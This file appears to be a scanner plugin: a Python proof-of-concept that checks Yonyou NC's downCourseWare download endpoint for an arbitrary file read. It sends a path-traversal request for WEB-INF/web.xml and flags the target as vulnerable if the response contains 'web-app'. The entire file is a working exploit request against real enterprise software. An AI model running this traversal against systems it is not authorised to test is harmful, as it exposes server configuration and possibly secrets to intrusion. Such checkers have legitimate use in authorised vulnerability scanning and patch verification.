import requests
import urllib

def verify(url):
    relsult = {
        'name': '用友NC-downCourseWare任意文件读取',
        'vulnerable': False,
        'url': url
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML,like Gecko)',
        'Connection':'close'
    }
    vurl = urllib.parse.urljoin(url, "/portal/pt/downCourseWare/download?fileName=%2e%2e/webapps/nc_web/WEB-INF/web.xml&pageId=login")
    try:
        response = requests.get(vurl, headers=headers)
        if response.status_code == 200 and 'web-app' in response.text:
            relsult['vulnerable'] = True
            relsult['verify'] = vurl
        return relsult

    except:
        return relsult